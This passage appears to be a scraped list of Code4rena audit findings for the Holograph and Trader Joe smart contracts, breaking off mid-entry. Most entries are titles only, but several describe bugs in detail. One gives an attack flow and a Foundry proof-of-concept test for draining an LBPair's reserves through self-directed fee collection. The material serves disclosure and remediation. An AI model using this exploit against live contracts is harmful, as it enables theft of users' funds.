(Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/44", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected-for-report", "edited-by-warden", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Impact Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed.  ## Proof of Concept ```solidity require(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\"); ```  ```solidity         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Since you have designed a mechanism to prevent other operators to slash the operator due to \"the selected missed the time slot due to a gas spike\". It can induce that operators won't perform their job if a gas price spike happens due to negative profit.  But your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using `gasPrice in bridgeInRequestPayload`. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn't submit any transaction yet. If it doesn't, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.  ```solidity require(timeDifference > 0, \"HOLOGRAPH: operator has time\"); ```  Once 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.  ## Recommended Mitigation Steps Modify your operator node software to queue transactions immediately with `gasPrice in bridgeInRequestPayload` if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/36", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/17", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/3", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/1", "labels": ["responded"], "target": "2022-10-holograph-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/480", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-14"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/477", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-11"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "User can lose input token amount while receiving no output token amount when swapping for output token that becomes non-existent", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/475", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-10"], "target": "2022-10-traderjoe-findings", "body": "User can lose input token amount while receiving no output token amount when swapping for output token that becomes non-existent"}, {"title": "Incorrect fee calculation on LBPair (fees collected on swaps are less than what they \"should\" be)", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "sponsor confirmed", "selected for report", "M-07"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L329-L330 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L124-L125   # Vulnerability details  # LBPair contracts consistently collect less fees than their FeeParameters --- ## Github and source code  https://github.com/sha256yan/incorrect-fee --- ## Motivation and Severity  LBpair contracts' fees fall short by 0.1% on single bin with the deficit growing exponentially with multi-bin swaps.   This report will refer to this difference in fees, that is, the difference between the expected fees and the actual collected fees as the \"Fee Deficit\".   ![feeDeficitGrowth](https://user-images.githubusercontent.com/91401566/197405701-e6df80c4-dcdf-44f5-9fd2-74ef1c66b954.png)  The exponential growth of the Fee Deficit percentage is concerning, considering that the vast majority of the fees collected by LPs and DEXs are during high volatility periods. Note that the peak Fee Deficit percentage of 1.6% means that 1.6% of expected fees would not be collected.     https://user-images.githubusercontent.com/91401566/197406096-5771893b-82f6-43e8-aa42-ccda449e4936.mov  With an assumed average total fee of 1% (higher than usual due to ```variableFee``` component) and average Fee Deficit percentage of 0.4%; The total Fee Deficit from a period similar to May 7th 2022 - May 14th 2022, with approximately \\$1.979B in trading volume, would be $***79,160*** over one week.     [SwapHelper.getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65) carries most of the blame for this error.   3 main causes have been identified and will be discussed in this report. - [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom) - [Incorrect conditional for amountIn overflow](#incorrect-conditional-for-amountin-overflow) - [Need for an additional FeeHelper function](#need-for-an-additional-feehelper-function)   ---      ### Affected contracts and libraries  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L304-L330)  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125)   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)  - SwapHelper.sol   - [getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65)   ---  ### Proposed changes  - FeeHelper.sol   - [getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/libraries/FeeHelper.sol#L164-L173) ( ***New*** )   - SwapHelper.sol   - [getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L118-L126) ( ***New*** )  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/716cddf2583da86674376cb5346bf46b701b242c/test/mocks/correctFee/LBRouterV2.sol#L124-L125) ( ***Modified*** )   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/c1719b8429c7d25e4e12fc4632842285a2eaaf8b/test/mocks/correctFee/LBRouterV2.sol#L168-L169) ( ***Modified*** )  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/test/mocks/correctFee/LBPair.sol#L332-L333)  ( ***Modified*** )  ---  ### Details - As mentioned earlier, most issues arise from SwapHelper.getAmounts . The SwapHelper library is often used for the Bin type. ([Example in LBPair](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L36)). The proposed solution includes the new functions [SwapHelper.getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/SwapHelper.sol#L76-L133) and [FeeHelper.getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/FeeHelper.sol#L164-L173). - LBPair.swap uses _bin.getAmounts(...) on the active bin to calculate fees. ([See here](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L329-L330)) - Inside of SwapHelper.getAmounts, for a given swap, if a bin has enough liqudity, the fee is calculated using ([FeeHelper.getFeeAmountFrom](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L65)). This results in smaller than expected fees.  - LBRouter.getSwapOut relies on SwapHelper.getAmounts to simulate swaps. Its simulations adjust to the correct fee upon using SwapHelper.getAmountsV2 ([LBRouter.getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125), [SwapHelper.getAmounts](), [SwapHelper.getAmountsV2]()) - LBRouter.getSwapIn has a fee calculation error which is independent of SwapHelper.getAmounts. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)) - As of right now the LBPair.swap using getAmountsV2 uses 3.8% ***more*** gas.  ![LBPair comparison](https://user-images.githubusercontent.com/91401566/197410772-e3f1cb99-7181-48f7-a56a-2430176a92ff.png)   ---   # Incorrect use of getFeeAmountFrom - When there is enough liquidity in a bin for a swap, we should use FeeHelper.getFeeAmount(amountIn) instead of FeeHelper.getFeeAmountFrom(amountIn).  ### Evidence - amountIn, the parameter passed to calculate fees, is the amount of tokens in the LBPair contract in excess of the reserves and fees of the pair for that token. [Inside LBPair.sol](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/LBPair.sol#L312-L314) --- [Inside TokenHelper](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/TokenHelper.sol#L59-L69)   Will now use example numbers: - Let amountIn = 1e10 (meaning the user has transferred/minted 1e10 tokens to the LBPair) - Let PRECISION = 1e18 - Let totalFee =  0.00125 x precision (fee of 0.0125%) - Let price = 1 (parity) - If the current bin has enough liqudity, feeAmount must be: (amountIn * totalFee ) / (PRECISION) = 12500000  - [FeeHelper.getFeeAmountFrom(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L124-L126) uses the formula: feeAmount = (amountIn * totalFee) / (PRECISION + totalFee) = 12484394 - [FeeHelper.getFeeAmount(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L116-L118) uses exactly the formula ourlined in the correct feeAmount calculation and is the correct method in this case. - Visit the tests section to run a test.    ---   # Incorrect condition for amountIn overflow - The [condition](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L61) for when an amountIn overflows the maximum amount available in a bin is flawed. - The Fee Deficit here could potentially trigger an unnecessary bin de-activation.  ### Evidence #### Snippet 1 (SwapHelper.getAmounts)  ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(_maxAmountInToBin));          if (_maxAmountInToBin + fees.total <= amountIn) {             //do things         } ``` - Collecting the fees on ```_maxAmountInToBin``` before doing so on ```amountIn``` means we are not checking  to see whether ```amountIn``` after   Consider the following: #### Snippet 2 (SwapHelper.getAmountsV2) ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(amountIn));          if (_maxAmountInToBin <  amountIn - fees.total) {             //do things         } ``` - Now, the fees are collected on ```amountIn```. - Assuming both conditions are true, the fees from Snippet2 will be necessarily larger than those in Snippet1 since in both cases ``` _maxAmountInToBin <  amountIn ```. - Snippet 1 produces false positives. Meaning, SwapHelper.getAmounts changes its active bin id more than needed. (See Tests section at the bottom for the relevant test)    ---     # Need for an additional FeeHelper function - There are currently functions to answer the following question: How many tokens must a user send, to end up with a given amountInToBin after fees, before the swap itself takes place?  ### Evidence - ```LBRouter.getSwapIn(, amountOut, )``` needs this question answered. At a given price, how many tokens must a user send, to receive ```amountOut```?   - We use the ```amountOut``` and price to work backwards to the ```amountInToBin```.   - Current approach calculates fees on ```amountInToBin```. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125))   - This is incorrect as fees should be calculated on ```amountIn```. (As we discussed in [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom))   - SwapHelper.getAmounts needs to know what hypothetical ```amountIn``` would end up as ```maxAmountInToBin``` after fees. This is needed to be able to avoid [Incorrect amountIn overflow](#incorrect-conditional-for-amountin-overflow)   ---   ## Install dependencies  To install dependencies, run the following to install dependencies:  ``` forge install ```  ___  ## Tests  To run tests, run the following command:  ``` forge test --match-contract Report -vv ``` --- ## testSingleBinSwapFeeDifference: - Simple test to show the Fee Defecit in it's most basic form. --- ## testFalsePositiveBinDeactivation - Test that shows false positive resulting from the [Incorrect condition](#incorrect-conditional-for-amountin-overflow) --- #### testCorrectFeeBinDeactivation - Test that shows with getAmountsV2 the false positive issue is resolved. --- ### testMultiBinGrowth - Generates datapoints used in opening graph. "}, {"title": "Calling `swapAVAXForExactTokens` function while sending excess amount cannot refund such excess amount", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "sponsor confirmed", "selected for report", "M-06"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521   # Vulnerability details  ## Impact When calling the `swapAVAXForExactTokens`  function, `if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value)` is executed, which is for refunding any excess amount sent in; this is confirmed by this function's comment as well. However, executing `amountsIn[0] - msg.value` will always revert when `msg.value > amountsIn[0]` is true. Developers who has the design of the `swapAVAXForExactTokens` function in mind could develop front-ends and contracts that will send excess amount when calling the `swapAVAXForExactTokens` function. Hence, the users, who rely on these front-ends and contracts for interacting with the `swapAVAXForExactTokens` function will always find such interactions being failed since calling this function with the excess amount will always revert. As a result, the user experience becomes degraded, and the usability of the protocol becomes limited.  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521 ```solidity     /// @notice Swaps AVAX for exact tokens while performing safety checks     /// @dev will refund any excess sent     ...     function swapAVAXForExactTokens(         uint256 _amountOut,         uint256[] memory _pairBinSteps,         IERC20[] memory _tokenPath,         address _to,         uint256 _deadline     )         external         payable         override         ensure(_deadline)         verifyInputs(_pairBinSteps, _tokenPath)         returns (uint256[] memory amountsIn)     {         ...          if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value);     } ```  ## Proof of Concept Please add the following test in `test\\LBRouter.Swaps.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testSwapAVAXForExactTokensIsUnableToRefund() public {         uint256 amountOut = 1e18;          (uint256 amountIn, ) = router.getSwapIn(pairWavax, amountOut, false);          IERC20[] memory tokenList = new IERC20[](2);         tokenList[0] = wavax;         tokenList[1] = token6D;         uint256[] memory pairVersions = new uint256[](1);         pairVersions[0] = DEFAULT_BIN_STEP;          vm.deal(DEV, amountIn + 500);          // Although the swapAVAXForExactTokens function supposes to refund any excess sent,         //   calling it reverts when sending more than amountIn         //   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow         vm.expectRevert(stdError.arithmeticError);         router.swapAVAXForExactTokens{value: amountIn + 1}(amountOut, pairVersions, tokenList, DEV, block.timestamp);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520 can be updated to the following code. ```solidity         if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, msg.value - amountsIn[0]); ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/446", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-09"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/437", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-13"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Attacker can keep fees max at no cost", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor acknowledged", "selected for report", "M-05"], "target": "2022-10-traderjoe-findings", "body": "Attacker can keep fees max at no cost"}, {"title": "Attacker can steal entire reserves by abusing fee calculation", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-05"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202   # Vulnerability details  ## Description  Similar to other LP pools, In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets. Users collect fees using collectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:  ```     function _getPendingFees(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private view returns (uint256 amountX, uint256 amountY) {         Debts memory _debts = _accruedDebts[_account][_id];          amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;         amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;     } ```  accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.  When liquidity is first minted to user, the \\_accruedDebts is updated to match current \\_balance * accToken\\*PerShare. Without this step, user could collect fees for the entire growth of accToken\\*PerShare from zero to current value. This is done in \\_updateUserDebts, called by \\_cacheFees() which is called by \\_beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.  ```     function _updateUserDebts(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private {         uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);         uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);          _accruedDebts[_account][_id].debtX = _debtX;         _accruedDebts[_account][_id].debtY = _debtY;     } ```  The critical problem lies in \\_beforeTokenTransfer:  ``` if (_from != _to) {     if (_from != address(0) && _from != address(this)) {         uint256 _balanceFrom = balanceOf(_from, _id);         _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);     }     if (_to != address(0) && _to != address(this)) {         uint256 _balanceTo = balanceOf(_to, _id);         _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);     } } ```  Note that if \\_from or \\_to is the LBPair contract itself, \\_cacheFees won't be called on \\_from or \\_to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.   This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken\\*PerShare value.  We can exploit this bug to collect the entire reserve assets. The attack flow is: - Transfer amount X to pair - Call pair.mint(), with the to address = pair address - call collectFees() with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work - Pair will now think user sent in money, because the bookkeeping is wrong. \\_pairInformation.feesX.total is decremented in collectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool: ``` uint256 _amountIn = _swapForY     ? tokenX.received(_pair.reserveX, _pair.feesX.total)     : tokenY.received(_pair.reserveY, _pair.feesY.total); ``` - Attacker calls swap() and receives reserve assets using the fees collected. - Attacker calls burn(), passing their own address in \\_to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.  Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued: ``` if (amountX != 0) {     _pairInformation.feesX.total -= uint128(amountX); } if (amountY != 0) {     _pairInformation.feesY.total -= uint128(amountY); } ```  If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.  ## Impact  Attacker can steal the entire reserves of the LBPair.  ## Proof of Concept  Paste this test in LBPair.Fees.t.sol:  ```     function testAttackerStealsReserve() public {         uint256 amountY=  53333333333333331968;         uint256 amountX = 100000;          uint256 amountYInLiquidity = 100e18;         uint256 totalFeesFromGetSwapX;         uint256 totalFeesFromGetSwapY;          addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);         uint256 id;         (,,id ) = pair.getReservesAndId();         console.log(\"id before\" , id);          //swap X -> Y and accrue X fees         (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);         totalFeesFromGetSwapX += feesXFromGetSwap;          token6D.mint(address(pair), amountXInForSwap);         vm.prank(ALICE);         pair.swap(true, DEV);         (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();          (,,id ) = pair.getReservesAndId();         console.log(\"id after\" , id);           console.log(\"Bob balance:\");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log(\"-------------\");          uint256 amount0In = 100e18;          uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);         uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);         uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);          console.log(\"Minting for BOB:\");         console.log(amount0In);         console.log(\"-------------\");          token6D.mint(address(pair), amount0In);         //token18D.mint(address(pair), amount1In);         pair.mint(_ids, _distributionX, _distributionY, address(pair));         uint256[] memory amounts = new uint256[](1);         console.log(\"***\");         for (uint256 i; i < 1; i++) {             amounts[i] = pair.balanceOf(address(pair), _ids[i]);             console.log(amounts[i]);         }         uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;         (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);         console.log(\"profit x\", profit_X);         console.log(\"profit y\", profit_Y);         pair.collectFees(address(pair), profit_ids);         (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);          console.log(\"swap x\", swap_x);         console.log(\"swap y\", swap_y);          console.log(\"Bob balance after swap:\");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log(\"-------------\");          console.log(\"*****\");         pair.burn(_ids, amounts, BOB);           console.log(\"Bob balance after burn:\");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log(\"-------------\");      } ```   ## Tools Used  Manual audit, foundry  ## Recommended Mitigation Steps  Code should not exempt any address from \\_cacheFees(). Even address(0) is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/406", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-12"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Wrong calculation in function `LBRouter._getAmountsIn` make user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-04"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L725   # Vulnerability details   ## Vulnerable detail  Function `LBRouter._getAmountsIn` is a helper function to return the amounts in with given `amountOut`. This function will check the pair of `_token` and `_tokenNext` is `JoePair` or `LBPair` using `_binStep`. * If `_binStep == 0`, it will be a `JoePair` otherwise it will be an `LBPair`. ```solidity= if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` As we can see when `_binStep == 0` and `_token < _tokenPath[i]` (in another word  we swap through `JoePair` and pair's`token0` is `_token` and `token1` is `_tokenPath[i]`), it will  1. Get the reserve of pair (`reserveIn`, `reserveOut`)  2. Calculate the `_amountIn` by using the formula  ``` amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1 ```  But unfortunately the denominator `_reserveOut - amountOut_ * 997` seem incorrect. It should be `(_reserveOut - amountOut_) * 997`.  We will do some math calculations here to prove the expression above is wrong.   **Input:**  * `_reserveIn (rIn)`: reserve of `_token` in pair  * `_reserveOut (rOut)`: reserve of `_tokenPath[i]` in pair  * `amountOut_`: the amount of `_tokenPath` the user wants to gain    **Output:**  * `rAmountIn`: the actual amount of `_token` we need to transfer to the pair.   **Generate Formula**  Cause `JoePair` [takes 0.3%](https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees) of `amountIn` as fee, we get  * `amountInDeductFee = amountIn' * 0.997`  Following the [constant product formula](https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula), we have  ```     rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_) ==> rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1 <=> amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1 <=> rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1 <=> rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1 <=>  ```  As we can see `rAmountIn` is different from `amountsIn[i - 1]`, the denominator of `rAmountIn` is `(rOut - amountOut_) * 997` when the denominator of `amountsIn[i - 1]` is `_reserveOut - amountOut_ * 997` (Missing one bracket)  ## Impact **Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.**   Let dive in the function `swapTokensForExactTokens()` to figure out why this scenario happens. I will assume I just swap through only one pool from `JoePair` and 0 pool from `LBPair`.  * Firstly function will get the list `amountsIn` from function `_getAmountsIn`. So `amountsIn` will be [`incorrectAmountIn`, `userDesireAmount`].      ```solidity=             // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440     amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);     ```  * Then it transfers `incorrectAmountIn` to `_pairs[0]` to prepare for the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444     _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);     ```   * Finally it calls function `_swapTokensForExactToken` to execute the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446         uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);     ```     In this step it will reach to [line 841](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841) which will set the expected `amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount`.     ```solidity=     // url = 